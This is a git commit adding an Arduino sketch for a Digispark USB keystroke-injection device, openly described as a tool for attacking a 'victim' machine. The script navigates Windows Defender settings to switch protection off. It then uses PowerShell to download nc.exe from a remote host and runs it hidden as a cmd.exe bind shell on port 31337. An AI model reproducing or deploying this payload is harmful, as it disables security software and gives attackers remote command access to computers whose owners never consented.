9233431e9e73ee638b08e511e1497a1282630355
Rogério Massouh <110058202+EndlssNightmare@users.noreply.github.com>
2023-07-14 01:13:20 -0300

    Create Netcat-Reverseshell.ino
    This script allows digispark to disable windows defender. Allows you to download netcat from http web with powershell and run netcat by opening the appropriate port. You can also change the order of the "/t" tabs in the script for your situation. I'm still finding a way to bypass the firewall, which prevents netcat from running instantly. to connect to the machine just type "nc victim ip port". To find the ip just add the script "Grab-WindowsSysinfo.ino" which is in that same repository.

---
+++ Netcat-Revshell/Netcat-Reverseshell.ino
@@ -0,0 +1,69 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  pinMode(1, HIGH);  //LED on Model A
+}
+
+void loop() {
+  //Desliga o Windows Defender
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //Abre o executar
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  //DigiKeyboard.print("\t");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("\t");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print("\t");  
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("\t");  //1 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("\t");  //1 TAB
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
+  DigiKeyboard.delay(3000);
+  //Reverse shell
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("Invoke-WebRequest -Uri http://IPTOGRABNETCA/nc.exe -OutFile test.exe");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell -windowstyle hidden ./test.exe -Lp 31337 -e cmd.exe");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //
+  digitalWrite(1, HIGH);  //turn on led when program finishes
+  DigiKeyboard.delay(5000);
+  digitalWrite(1, LOW); // LED off <--> Action end
+  for(;;){ /*empty*/ }
+}
